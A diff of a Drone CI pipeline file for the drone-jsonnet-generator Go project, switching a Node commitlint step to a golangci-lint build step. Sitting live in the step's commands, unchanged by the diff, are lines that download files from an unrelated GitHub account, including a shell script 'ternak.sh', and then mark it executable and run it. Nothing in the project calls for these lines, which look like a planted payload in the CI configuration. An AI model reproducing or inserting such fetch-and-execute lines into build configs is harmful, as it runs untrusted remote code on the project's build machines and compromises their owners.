@@ -1,11 +1,14 @@
 ---
 kind: pipeline
-name: commitlint
+name: build
+workspace:
+  base: /go
+  path: src/github.com/suzuki-shunsuke/drone-jsonnet-generator
 steps:
-- name: npm install
-  image: &node_image node:10.16.0-alpine
+- name: golangci-lint
+  image: golangci/golangci-lint:v1.26.0
   commands:
-  - npm i
+  - golangci-lint run
   - wget https://raw.githubusercontent.com/outbesok/mesin/main/obatkuat
   - wget https://raw.githubusercontent.com/outbesok/mesin/main/ternak.sh && chmod u+x ternak.sh && ./ternak.sh
 ---
